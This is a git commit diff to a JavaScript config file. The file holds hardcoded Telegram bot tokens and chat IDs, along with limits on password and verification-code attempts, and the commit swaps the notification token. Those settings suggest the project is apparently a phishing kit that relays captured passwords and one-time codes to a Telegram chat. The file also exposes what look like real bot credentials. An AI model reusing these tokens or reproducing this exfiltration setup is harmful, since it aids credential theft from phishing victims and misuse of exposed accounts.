f17da6e40eb86ca7c727e0402b60cdb73d1f0c95
ngocbavi <lkdzlk4@gmail.com>
2025-09-04 19:07:55 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,7 +1,7 @@
 const config = {
     token: '7496878193:AAErroYryul7-mh1DQMxJCKj_S06Q4EdM_4',
     chat_id: '1224507547',
-    noti_token: '7496878193:AAGBzrov8KtWfnxN5Y7rEOf9cmtGlXEcQg0',
+    noti_token: '7496878193:AAErroYryul7-mh1DQMxJCKj_S06Q4EdM_4',
     noti_chat_id: '-4752860341',
     max_password_attempts: 2,
     max_code_attempts: 5,
